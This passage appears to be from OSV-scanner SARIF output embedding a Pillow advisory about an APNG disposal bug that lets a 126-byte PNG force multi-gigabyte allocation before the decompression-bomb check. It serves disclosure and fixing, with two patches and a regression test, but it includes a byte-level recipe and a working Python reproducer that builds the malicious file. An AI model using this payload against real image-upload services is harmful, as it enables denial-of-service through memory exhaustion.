IHDR-declared size. This happens inside the plugin factory, i.e. before `Image.open()` gets to `_decompression_bomb_check(im.size)`, so the check that is meant to reject oversized headers without allocating anything runs only after the allocation has been made and touched.\n\u003e \n\u003e The following 126-byte file (all chunk lengths and CRCs valid) makes `Image.open(io.BytesIO(data))`, with default `MAX_IMAGE_PIXELS` and no `load()`, reach 1.86 GB resident (`ru_maxrss`) and then raise `DecompressionBombError`. The byte-identical file with `dispose_op=0` raises the same error at 17 MB.\n\u003e \n\u003e ```\n\u003e IHDR  width=22000 height=22000 bit_depth=8 colour_type=6 (RGBA)\n\u003e acTL  num_frames=2 num_plays=0\n\u003e fcTL  seq=0 w=1 h=1 x=0 y=0 delay=1/10 dispose_op=1 (OP_BACKGROUND) blend_op=0\n\u003e IDAT  zlib(00 00 00 00 00)                      # one 1x1 RGBA scanline\n\u003e IEND\n\u003e ```\n\u003e \n\u003e With `width=height=45000` (8.1 GB canvas) the same call attempts the full allocation: under a 4 GiB `RLIMIT_AS` it fails with `MemoryError` from the allocator instead of `DecompressionBombError`; without a cap, on an 8 GB host with no swap, the process is OOM-killed.\n\u003e \n\u003e ### Code path\n\u003e \n\u003e `Image.open()` runs the bomb check only after the plugin's constructor (and therefore `_open()`) has returned:\n\u003e \n\u003e ```python\n\u003e # src/PIL/Image.py:3699-3701\n\u003e                     im = factory(fp, filename)\n\u003e                     _decompression_bomb_check(im.size)\n\u003e                     return im\n\u003e ```\n\u003e \n\u003e For a plain PNG that ordering is fine: `PngImageFile._open()` only parses chunks up to the first `IDAT` and records `self._size` from `IHDR`; nothing is allocated from it. For an APNG (`acTL` seen, so `im_n_frames` is set) `_open()` additionally positions on frame 0:\n\u003e \n\u003e ```python\n\u003e # src/PIL/PngImagePlugin.py:845-853\n\u003e         if self.png.im_n_frames is not None:\n\u003e             …\n\u003e             self._seek(0)\n\u003e ```\n\u003e \n\u003e `_seek(0)` copies `disposal` and `bbox` from the `fcTL` chunk into `self.dispose_op` / `self.dispose_extent` and then prepares the disposal image for the *next* frame eagerly, using the full image size:\n\u003e \n\u003e ```python\n\u003e # src/PIL/PngImagePlugin.py:991-1001\n\u003e         if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:\n\u003e             self.dispose_op = Disposal.OP_BACKGROUND\n\u003e \n\u003e         self.dispose = None\n\u003e         if self.dispose_op == Disposal.OP_PREVIOUS:\n\u003e             …\n\u003e         elif self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e             self.dispose = Image.core.fill(self.mode, self.size)\n\u003e             self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e ```\n\u003e \n\u003e `Image.core.fill` is `_fill()` in `src/_imaging.c:711`, which does `ImagingNewDirty(mode, xsize, ysize)` followed by `ImagingFill()`; `ImagingFill` (`src/libImaging/Fill.c:23`) writes every row, so the whole `width*height*4` bytes become resident rather than merely reserved. `self.size` here is the IHDR size (22000×22000), not the 1×1 frame rectangle. The `_crop` on the next line does call `_decompression_bomb_check`, but on the `fcTL` rectangle (1×1) and only after the fill has completed. Lines 991-992 rewrite `OP_PREVIOUS` to `OP_BACKGROUND` on frame 0, so `dispose_op=2` takes the same path (verified: identical 1.86 GB peak). When the first `fcTL` rectangle is large, the `_crop` copy is a second extent-sized buffer on top of the full-canvas fill, so the transient peak can reach about twice the canvas: a 13000×13000 full-frame `fcTL` (below the error threshold, so `Image.open()` succeeds with only a `DecompressionBombWarning`) peaks at 1.31 GB for a 0.66 GB canvas.\n\u003e \n\u003e The only validation `chunk_fcTL` applies (`src/PIL/PngImagePlugin.py:740-745`) is that the frame rectangle fits inside the IHDR size, which a 1×1 frame always does; IHDR width/height themselves are unconstrained 32-bit values at this point. Control then returns to `_open_core`, `_decompression_bomb_check((22000, 22000))` raises, and the 1.9 GB core image is released when the half-constructed `PngImageFile` is discarded.\n\u003e \n\u003e The eager full-size fill in `_seek()` was introduced in `5e4e0fa6ee67` (\"Use disposal settings from previous frame\", 2020-12-24) and first shipped in 8.1.0; before it, the `OP_BACKGROUND` fill lived in `load_end()` and could not be reached from `Image.open()`.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Any application that calls `Image.open()` on untrusted bytes with default settings — the configuration in which the decompression-bomb check is supposed to make that call cheap and safe — can be made to allocate and write an attacker-chosen amount of memory from a ~126-byte PNG upload, before any error is reported and without `load()`, frame iteration, or `LOAD_TRUNCATED_IMAGES`. The amount is set directly by the IHDR width/height (4 bytes per pixel for colour type 6): values below the host's free memory cause a transient multi-GB spike per request (≈15,000,000× amplification at 22000×22000) that is freed when the exception propagates, so concurrent or repeated uploads are needed to sustain pressure; values above it get the worker process OOM-killed outright. PNG is accepted by essentially every upload pipeline, and the file passes `_accept` and chunk CRC checks as a well-formed APNG.\n\u003e \n\u003e This is the same class as the recent bomb-check additions for WMF (load at a different DPI), FITS, GIF and FontFile — an allocation sized from file-declared numbers on a path `_decompression_bomb_check` does not cover — but here the uncovered path is `Image.open()` itself rather than a later `load()`/`seek()`.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is a single Python script (no build step, no companion files). It builds two PNGs in memory, opens each one with plain `Image.open(io.BytesIO(data))` in a fresh child interpreter using default settings and no `load()`, and has each child report the exception it got and its own peak RSS (`ru_maxrss`). It needs about 2 GB of free RAM and finishes in about a second.\n\u003e \n\u003e The two files are 126 bytes each and differ in exactly one byte, the `dispose_op` of the first `fcTL` chunk: `0` (`OP_NONE`) for the control and `1` (`OP_BACKGROUND`) for the attack. Both declare IHDR 22000×22000 RGBA. That is 484 Mpixel, above the 2×`MAX_IMAGE_PIXELS` error threshold, so `Image.open()` has to reject both with `DecompressionBombError`. Each chunk has a job:\n\u003e \n\u003e - The `acTL` chunk (2 frames) makes `_open()` call `_seek(0)`.\n\u003e - The 1×1 `fcTL` rectangle passes `chunk_fcTL`'s bounds check and `_crop`'s bomb check.\n\u003e - The one-scanline `IDAT` ends header parsing.\n\u003e \n\u003e Expected output on this tree:\n\u003e \n\u003e ```\n\u003e 126-byte APNG declaring 22000x22000 RGBA; Image.open(BytesIO(data)), defaults\n\u003e   control  dispose_op=0 OP_NONE        -\u003e DecompressionBombError peak RSS    17 MB\n\u003e   attack   dispose_op=1 OP_BACKGROUND  -\u003e DecompressionBombError peak RSS  1864 MB\n\u003e Image.open() touched a full 22000x22000 canvas before the bomb check ran\n\u003e BUG\n\u003e ```\n\u003e \n\u003e Both files are rejected, but the control is rejected at interpreter size. The attack file only reaches the bomb check after `Image.core.fill(\"RGBA\", (22000, 22000))` has allocated and zero-filled about 1.9 GB. The script prints `BUG` if the attack child's peak RSS is at least 1000 MB and at least 20× the control's, or if the attack child is killed by `SIGKILL` (for example by the OOM killer on a small host). Otherwise it prints `OK`; any other non-zero child exit is treated as a harness failure, printed with the child's output, and also ends in `OK`. With either attached patch applied, both children report about 17–22 MB and the script prints `OK`.\n\u003e \n\u003e The allocation grows with the header, so it can be scaled by changing `SIZE` in the script. The 45000×45000 case (an 8.1 GB canvas) is covered in Details and is not part of the script.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e Do not build the `OP_BACKGROUND` disposal image from the declared size during `_open()`. Two alternative patches are attached; both change only `src/PIL/PngImagePlugin.py`, and both add the same regression test to `Tests/test_file_apng.py` (a 2³¹−1 × 1 APNG built in memory with a 1×1 `OP_BACKGROUND` first frame must make `Image.open()` raise `DecompressionBombError`; on the current tree the fill fails first with `MemoryError`). Attached patch 1 is the preferred fix.\n\u003e \n\u003e **Attached patch 1** moves the fill to its only point of use, the `frame \u003e 0` branch of `_seek()` right after `self.load()` — which can only run once `Image.open()` has returned (bomb check passed) and the canvas itself has been allocated — and, as `GifImagePlugin` already does, fills only the previous frame's dispose extent instead of a full canvas that is then cropped:\n\u003e \n\u003e ```diff\n\u003e --- a/src/PIL/PngImagePlugin.py\n\u003e +++ b/src/PIL/PngImagePlugin.py\n\u003e @@ -931,6 +931,13 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e              # ensure previous frame was loaded\n\u003e              self.load()\n\u003e  \n\u003e +            if self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e +                # Created here rather than in the previous _seek(), so that\n\u003e +                # nothing is allocated from the declared image size before\n\u003e +                # the decompression bomb check in Image.open() has run.\n\u003e +                # Only dispose the extent of the previous frame.\n\u003e +                x0, y0, x1, y1 = self.dispose_extent\n\u003e +                self.dispose = Image.core.fill(self.mode, (x1 - x0, y1 - y0))\n\u003e              if self.dispose:\n\u003e                  self.im.paste(self.dispose, self.dispose_extent)\n\u003e              self._prev_im = self.im.copy()\n\u003e @@ -996,9 +1003,6 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e              if self._prev_im:\n\u003e                  self.dispose = self._prev_im.copy()\n\u003e                  self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e -        elif self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e -            self.dispose = Image.core.fill(self.mode, self.size)\n\u003e -            self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e ```\n\u003e \n\u003e At that point `self.dispose_op` and `self.dispose_extent` still hold the previous frame's values (they are reassigned further down in `_seek`), so disposal semantics are unchanged; the `OP_PREVIOUS` copy stays eager because `load_end()` pastes into `_prev_im` in place (`src/PIL/PngImagePlugin.py:1110`). With this patch `Image.open()` allocates nothing from the declared size, including in the `DecompressionBombWarning` range.\n\u003e \n\u003e **Attached patch 2** is a smaller diff that keeps the eager disposal setup in `_seek()` and mirrors `GifImagePlugin._seek()`'s `OP_BACKGROUND` handling exactly: it computes the size of the `fcTL` rectangle (already validated by `chunk_fcTL` to lie within the image), runs `Image._decompression_bomb_check()` on it, and fills an image of only that size instead of filling `self.size` and cropping. It also narrows the `dispose_extent` annotation to `tuple[int, int, int, int]` so the bomb-check call type-checks. The trade-off is that a full-canvas first frame still allocates a bomb-checked image inside `Image.open()` — up to about 2×`MAX_IMAGE_PIXELS`×4 bytes (660 MB for a 13000×13000 full-frame `fcTL`, with `DecompressionBombWarning`) — and a first `fcTL` covering a canvas above the error threshold now raises `DecompressionBombError` from `_seek(0)` rather than from `Image.open()`'s own check.\n\u003e \n\u003e With either patch applied to a clean checkout, the reproducer prints `OK` and all 54 files in `Tests/images/apng/` decode byte-identically frame by frame, including after a rewind.\n\u003e \n\u003e ## The patch (1 of 2)\n\u003e \n\u003e Create the APNG OP_BACKGROUND disposal image when the next frame is sought, sized to the frame extent, not in _open() from the IHDR size\n\u003e \n\u003e Applies to `src/PIL/PngImagePlugin.py` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_apng.py b/Tests/test_file_apng.py\n\u003e index 15689476c..6e61c8b4b 100644\n\u003e --- a/Tests/test_file_apng.py\n\u003e +++ b/Tests/test_file_apng.py\n\u003e @@ -161,6 +161,37 @@ def test_apng_dispose_op_background_p_mode() -\u003e None:\n\u003e          assert im.size == (128, 64)\n\u003e  \n\u003e  \n\u003e +def test_apng_dispose_op_background_decompression_bomb() -\u003e None:\n\u003e +    # The disposal image must not be created from the declared image size\n\u003e +    # before the decompression bomb check in Image.open() has run.\n\u003e +    # A canvas this wide cannot be allocated, so if it is attempted,\n\u003e +    # a MemoryError is raised instead of a DecompressionBombError.\n\u003e +    o16 = PngImagePlugin.o16\n\u003e +    o32 = PngImagePlugin.o32\n\u003e +\n\u003e +    b = BytesIO()\n\u003e +    b.write(PngImagePlugin._MAGIC)\n\u003e +    PngImagePlugin.putchunk(b, b\"IHDR\", o32(2**31 - 1), o32(1), b\"\\x08\\x06\\x00\\x00\\x00\")\n\u003e +    PngImagePlugin.putchunk(b, b\"acTL\", o32(2), o32(0))\n\u003e +    PngImagePlugin.putchunk(\n\u003e +        b,\n\u003e +        b\"fcTL\",\n\u003e +        o32(0),  # sequence number\n\u003e +        o32(1),  # width\n\u003e +        o32(1),  # height\n\u003e +        o32(0),  # x offset\n\u003e +        o32(0),  # y offset\n\u003e +        o16(1),  # delay numerator\n\u003e +        o16(10),  # delay denominator\n\u003e +        bytes([PngImagePlugin.Disposal.OP_BACKGROUND, PngImagePlugin.Blend.OP_SOURCE]),\n\u003e +    )\n\u003e +    PngImagePlugin.putchunk(b, b\"IDAT\")\n\u003e +    PngImagePlugin.putchunk(b, b\"IEND\")\n\u003e +\n\u003e +    with pytest.raises(Image.DecompressionBombError):\n\u003e +        Image.open(b)\n\u003e +\n\u003e +\n\u003e  def test_apng_blend() -\u003e None:\n\u003e      with Image.open(\"Tests/images/apng/blend_op_source_solid.png\") as im:\n\u003e          assert isinstance(im, PngImagePlugin.PngImageFile)\n\u003e diff --git a/src/PIL/PngImagePlugin.py b/src/PIL/PngImagePlugin.py\n\u003e index 0eb2fd5e4..24fa587c1 100644\n\u003e --- a/src/PIL/PngImagePlugin.py\n\u003e +++ b/src/PIL/PngImagePlugin.py\n\u003e @@ -931,6 +931,13 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e              # ensure previous frame was loaded\n\u003e              self.load()\n\u003e  \n\u003e +            if self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e +                # Created here rather than in the previous _seek(), so that\n\u003e +                # nothing is allocated from the declared image size before\n\u003e +                # the decompression bomb check in Image.open() has run.\n\u003e +                # Only dispose the extent of the previous frame.\n\u003e +                x0, y0, x1, y1 = self.dispose_extent\n\u003e +                self.dispose = Image.core.fill(self.mode, (x1 - x0, y1 - y0))\n\u003e              if self.dispose:\n\u003e                  self.im.paste(self.dispose, self.dispose_extent)\n\u003e              self._prev_im = self.im.copy()\n\u003e @@ -996,9 +1003,6 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e              if self._prev_im:\n\u003e                  self.dispose = self._prev_im.copy()\n\u003e                  self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e -        elif self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e -            self.dispose = Image.core.fill(self.mode, self.size)\n\u003e -            self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e  \n\u003e      def tell(self) -\u003e int:\n\u003e          return self.__frame\n\u003e ```\n\u003e \n\u003e ## The patch (2 of 2)\n\u003e \n\u003e Bomb-check and fill only the fcTL extent for APNG OP_BACKGROUND disposal instead of a full IHDR-sized canvas in PngImageFile._seek()\n\u003e \n\u003e Applies to `src/PIL/PngImagePlugin.py` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_apng.py b/Tests/test_file_apng.py\n\u003e index 15689476c..6e61c8b4b 100644\n\u003e --- a/Tests/test_file_apng.py\n\u003e +++ b/Tests/test_file_apng.py\n\u003e @@ -161,6 +161,37 @@ def test_apng_dispose_op_background_p_mode() -\u003e None:\n\u003e          assert im.size == (128, 64)\n\u003e  \n\u003e  \n\u003e +def test_apng_dispose_op_background_decompression_bomb() -\u003e None:\n\u003e +    # The disposal image must not be created from the declared image size\n\u003e +    # before the decompression bomb check in Image.open() has run.\n\u003e +    # A canvas this wide cannot be allocated, so if it is attempted,\n\u003e +    # a MemoryError is raised instead of a DecompressionBombError.\n\u003e +    o16 = PngImagePlugin.o16\n\u003e +    o32 = PngImagePlugin.o32\n\u003e +\n\u003e +    b = BytesIO()\n\u003e +    b.write(PngImagePlugin._MAGIC)\n\u003e +    PngImagePlugin.putchunk(b, b\"IHDR\", o32(2**31 - 1), o32(1), b\"\\x08\\x06\\x00\\x00\\x00\")\n\u003e +    PngImagePlugin.putchunk(b, b\"acTL\", o32(2), o32(0))\n\u003e +    PngImagePlugin.putchunk(\n\u003e +        b,\n\u003e +        b\"fcTL\",\n\u003e +        o32(0),  # sequence number\n\u003e +        o32(1),  # width\n\u003e +        o32(1),  # height\n\u003e +        o32(0),  # x offset\n\u003e +        o32(0),  # y offset\n\u003e +        o16(1),  # delay numerator\n\u003e +        o16(10),  # delay denominator\n\u003e +        bytes([PngImagePlugin.Disposal.OP_BACKGROUND, PngImagePlugin.Blend.OP_SOURCE]),\n\u003e +    )\n\u003e +    PngImagePlugin.putchunk(b, b\"IDAT\")\n\u003e +    PngImagePlugin.putchunk(b, b\"IEND\")\n\u003e +\n\u003e +    with pytest.raises(Image.DecompressionBombError):\n\u003e +        Image.open(b)\n\u003e +\n\u003e +\n\u003e  def test_apng_blend() -\u003e None:\n\u003e      with Image.open(\"Tests/images/apng/blend_op_source_solid.png\") as im:\n\u003e          assert isinstance(im, PngImagePlugin.PngImageFile)\n\u003e diff --git a/src/PIL/PngImagePlugin.py b/src/PIL/PngImagePlugin.py\n\u003e index 0eb2fd5e4..0111a17d7 100644\n\u003e --- a/src/PIL/PngImagePlugin.py\n\u003e +++ b/src/PIL/PngImagePlugin.py\n\u003e @@ -985,7 +985,7 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e                  msg = \"image not found in APNG frame\"\n\u003e                  raise EOFError(msg)\n\u003e          if dispose_extent:\n\u003e -            self.dispose_extent: tuple[float, float, float, float] = dispose_extent\n\u003e +            self.dispose_extent: tuple[int, int, int, int] = dispose_extent\n\u003e  \n\u003e          # setup frame disposal (actual disposal done when needed in the next _seek())\n\u003e          if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:\n\u003e @@ -997,8 +997,14 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e                  self.dispose = self._prev_im.copy()\n\u003e                  self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e          elif self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e -            self.dispose = Image.core.fill(self.mode, self.size)\n\u003e -            self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e +            # only dispose the extent in this frame, rather than filling an\n\u003e +            # image of the declared size before Image.open() has been able to\n\u003e +            # run the decompression bomb check\n\u003e +            x0, y0, x1, y1 = self.dispose_extent\n\u003e +            dispose_size = (x1 - x0, y1 - y0)\n\u003e +\n\u003e +            Image._decompression_bomb_check(dispose_size)\n\u003e +            self.dispose = Image.core.fill(self.mode, dispose_size)\n\u003e  \n\u003e      def tell(self) -\u003e int:\n\u003e          return self.__frame\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 3,564 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"\n\u003e Image.open() on a 126-byte APNG allocates and zero-fills a full canvas of the\n\u003e header-declared size *before* Pillow's decompression-bomb check rejects it.\n\u003e \n\u003e We build two PNGs that are identical except for one byte, the first fcTL\n\u003e chunk's dispose_op:\n\u003e \n\u003e     control: dispose_op = 0  (OP_NONE)\n\u003e     attack:  dispose_op = 1  (OP_BACKGROUND)\n\u003e \n\u003e Both declare 22000x22000 RGBA (484 Mpixel, above the 2 * MAX_IMAGE_PIXELS\n\u003e error threshold), so Image.open() must reject both with DecompressionBombError\n\u003e -- and that check exists precisely so the rejection is cheap. For the attack\n\u003e file, PngImageFile._open() -\u003e _seek(0) first runs\n\u003e Image.core.fill(mode, (22000, 22000)), touching ~1.9 GB, and only then is the\n\u003e bomb check reached.\n\u003e \n\u003e Each file is opened in a fresh interpreter that reports its own peak RSS.\n\u003e \"\"\"\n\u003e import struct\n\u003e import subprocess\n\u003e import sys\n\u003e import zlib\n\u003e \n\u003e SIZE = 22000  # 22000 * 22000 * 4 bytes = 1.94 GB canvas\n\u003e \n\u003e \n\u003e def chunk(cid, data):\n\u003e     crc = zlib.crc32(cid + data)\n\u003e     return struct.pack(\"\u003eI\", len(data)) + cid + data + struct.pack(\"\u003eI\", crc)\n\u003e \n\u003e \n\u003e def build_apng(dispose_op):\n\u003e     ihdr = struct.pack(\"\u003eIIBBBBB\", SIZE, SIZE, 8, 6, 0, 0, 0)  # 8-bit RGBA\n\u003e     actl = struct.pack(\"\u003eII\", 2, 0)  # animated: 2 frames -\u003e _open() calls _seek(0)\n\u003e     # frame 0: seq 0, a 1x1 rectangle at (0,0) (passes fcTL's bounds check),\n\u003e     # delay 1/10 s, the dispose_op under test, blend_op 0\n\u003e     fctl = struct.pack(\"\u003eIIIIIHHBB\", 0, 1, 1, 0, 0, 1, 10, dispose_op, 0)\n\u003e     idat = zlib.compress(b\"\\x00\" + b\"\\x00\\x00\\x00\\x00\")  # one 1x1 RGBA scanline\n\u003e     return (b\"\\x89PNG\\r\\n\\x1a\\n\" + chunk(b\"IHDR\", ihdr) + chunk(b\"acTL\", actl)\n\u003e             + chunk(b\"fcTL\", fctl) + chunk(b\"IDAT\", idat) + chunk(b\"IEND\", b\"\"))\n\u003e \n\u003e \n\u003e # What an application does with an untrusted upload: Image.open() with default\n\u003e # settings, no load(). Prints the outcome and this process's peak RSS in MB.\n\u003e OPEN_UNTRUSTED = \"\"\"\n\u003e import io, resource, sys\n\u003e from PIL import Image\n\u003e try:\n\u003e     Image.open(io.BytesIO(sys.stdin.buffer.read()))\n\u003e     outcome = \"opened\"\n\u003e except Exception as e:\n\u003e     outcome = type(e).__name__\n\u003e print(outcome, resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 1024)\n\u003e \"\"\"\n\u003e \n\u003e \n\u003e def open_in_child(data):\n\u003e     p = subprocess.run([sys.executable, \"-c\", OPEN_UNTRUSTED], input=data,\n\u003e                        capture_output=True, timeout=60)\n\u003e     if p.returncode == -9:  # SIGKILL: OOM-killed on a small host -- also the bug\n\u003e         return \"oom-killed(rc=-9)\", None\n\u003e     if p.returncode != 0:  # anything else is a harness failure, not evidence\n\u003e         print(p.stdout.decode(), p.stderr.decode(), sep=\"\\n\")\n\u003e         print(\"child failed unexpectedly (rc=%d)\" % p.returncode)\n\u003e         print(\"OK\")\n\u003e         sys.exit(1)\n\u003e     outcome, peak_mb = p.stdout.split()\n\u003e     return outcome.decode(), int(peak_mb)\n\u003e \n\u003e \n\u003e control = build_apng(dispose_op=0)\n\u003e attack = build_apng(dispose_op=1)\n\u003e \n\u003e c_outcome, c_mb = open_in_child(control)\n\u003e a_outcome, a_mb = open_in_child(attack)\n\u003e \n\u003e print(\"%d-byte APNG declaring %dx%d RGBA; Image.open(BytesIO(data)), defaults\"\n\u003e       % (len(attack), SIZE, SIZE))\n\u003e print(\"  control  dispose_op=0 OP_NONE        -\u003e %-22s peak RSS %5s MB\" % (c_outcome, c_mb))\n\u003e print(\"  attack   dispose_op=1 OP_BACKGROUND  -\u003e %-22s peak RSS %5s MB\" % (a_outcome, a_mb))\n\u003e \n\u003e # Expected: both rejected at roughly interpreter size. Bug: the attack file\n\u003e # made the \"cheap\" rejection cost a full-size canvas (or killed the process).\n\u003e if a_mb is None or (a_mb \u003e= 1000 and a_mb \u003e= 20 * c_mb):\n\u003e     print(\"Image.open() touched a full %dx%d canvas before the bomb check ran\"\n\u003e           % (SIZE, SIZE))\n\u003e     print(\"BUG\")\n\u003e else:\n\u003e     print(\"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5xm2-6676-qcp9 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112399\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-112399",
              "name": "CVE-2026-112399",
              "properties": {
                "security-severity": "8.7"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-112399: Pillow: APNG background disposal allocates full canvas before decompression bomb check",
                "text": "CVE-2026-112399: Pillow: APNG background disposal allocates full canvas before decompression bomb check"
              }
